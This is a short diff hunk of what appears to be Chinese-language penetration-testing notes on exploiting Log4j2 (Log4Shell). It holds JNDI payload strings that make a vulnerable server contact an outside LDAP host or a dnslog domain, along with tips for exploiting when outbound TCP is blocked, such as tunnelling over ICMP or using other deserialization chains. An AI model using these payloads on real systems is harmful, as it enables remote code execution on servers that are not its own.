@@ -66,6 +66,7 @@ ${jndi:ldap://192.168.1.8:2113/akndj}
 **log4j2不出网：**
 rmi和ladp都是走的tcp协议，如果有网络防火墙tcp不出网，还想利用，将其转成icmp协议出网再转回来。
 验证则直接用dns协议(jndi支持dns://)去实现dnslog：${jndi:dns://***.dnslog.cn/exp} 。
+或不使用JNDI，使用其他利用链，原生反序列化链等。
 
 ^
 复现：
